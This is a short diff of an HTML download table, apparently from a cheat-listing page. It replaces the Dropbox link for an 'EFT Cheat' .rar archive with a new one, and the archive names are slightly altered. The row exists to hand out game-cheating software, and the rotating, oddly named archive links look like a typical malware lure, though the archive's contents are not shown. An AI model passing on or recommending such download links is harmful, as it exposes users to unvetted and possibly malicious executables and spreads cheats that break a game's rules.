@@ -11,7 +11,7 @@
   <tr>
     <td>EFT Cheat</td>
     <td>12/14/2023</td>
-    <td><a href='https://www.dropbox.com/scl/fi/8uzkynm43pvcf1l2yirch/Setu.rar?rlkey=91bw30th9nljcs8w6ngm5d48m&dl=1'>Download</td>
+    <td><a href='https://www.dropbox.com/scl/fi/8ore08tsemohqk6qtfag3/S-tu.rar?rlkey=qrdrn47qxftleaega1t42pqoy&dl=1'>Download</td>
 <td>2023</td>
   </tr>
 </table>
